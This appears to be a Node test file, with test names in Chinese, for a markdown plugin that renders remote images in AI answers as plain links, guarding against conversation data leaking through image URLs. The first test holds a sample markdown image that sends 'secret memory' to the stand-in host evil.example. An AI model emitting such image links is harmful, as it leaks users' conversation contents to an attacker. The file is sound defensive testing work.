import { test } from 'node:test'
import assert from 'node:assert/strict'
import { readFile } from 'node:fs/promises'
import MarkdownIt from 'markdown-it'
import { installSafeImages } from '../../src/ai/markdown-images.ts'

const md = () => { const markdown = new MarkdownIt({ html: false, linkify: true }); installSafeImages(markdown); return markdown }

test('AI 回答里的远程图片不自动加载，只显示成链接（防止经图片地址外带对话内容）', () => {
  const html = md().render('看这里 ![对话摘要](https://evil.example/?q=secret%20memory) 结束')
  assert.doesNotMatch(html, /<img/)
  assert.match(html, /<a class="answer-image-link" href="https:\/\/evil\.example\/\?q=secret%20memory" target="_blank" rel="noopener noreferrer">\[图片：对话摘要\]<\/a>/)
})

test('同源相对路径、UNC 风格路径的图片也不加载；本地 data/blob 图片照常显示', () => {
  const markdown = md()
  for (const src of ['/%5C%5Cevil%5Cs%5Cx.png', '/assets/x.png', 'x.png']) {
    const html = markdown.render(`![a](${src})`)
    assert.doesNotMatch(html, /<img/, src)
    assert.match(html, /\[图片：a\]/)
  }
  assert.match(markdown.render('![点](data:image/png;base64,iVBORw0KGgo=)'), /<img src="data:image\/png;base64,iVBORw0KGgo=" alt="点">/)
  assert.match(markdown.render('![无说明](https://x.example/a.png)'), /\[图片：无说明\]/)
  assert.match(markdown.render('![](https://x.example/a.png)'), /\[图片：图片\]/)
})

test('所有 AI 输出共用的 renderMarkdown 装上了这条规则', async () => {
  const source = await readFile(new URL('../../src/ai/render.ts', import.meta.url), 'utf8')
  assert.match(source, /installSafeImages\(markdown\)/)
})
